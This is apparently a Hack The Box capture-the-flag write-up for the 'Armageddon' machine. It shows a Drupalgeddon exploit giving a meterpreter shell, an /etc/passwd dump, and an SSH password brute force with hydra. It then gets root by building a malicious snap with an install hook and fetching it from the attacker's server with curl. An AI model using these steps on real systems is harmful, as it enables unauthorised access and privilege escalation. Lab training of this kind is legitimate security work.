So armageddon, immidiately i knew it would involve the drupalgeddon cve so i set to seeing the version of the app being run and quickly got a meterpreter session.

After farting around i found the following

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

So a user 

brucetherealadmin , lets bruteforce it 

```bash
hydra -l brucetherealadmin -P /usr/share/wordlists/rockyou.txt ssh://10.129.48.89

```

isssa hit (

22][ssh] host: 10.129.48.89   login: brucetherealadmin   password: booboo

as such got user flag 98815877ac8654614a32178c5193a00d

after a basic sudo -l we see this

```bash
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

so looks like we can perhaps install something here

This GTFO bin was a great source so…

<aside>
💡

COMMAND="cat /root/root.txt"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}

┌─[eu-dedivip-2]─[10.10.14.211]─[sm1gspl0it@htb-mlehm8tbnq]─[/tmp/tmp.6FhDt9yocF]
└──╼ [★]$ ls

  xxxx_1.0_all.snap

</aside>

After this i curled from my http server to grab the snap payload

```bash

curl http://10.10.14.211/ xxxx_1.0_all.snap -O exploit.snap

```

```bash
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": a4c682deb9fcce578c6b87368edf961e)

```

Got me root flag
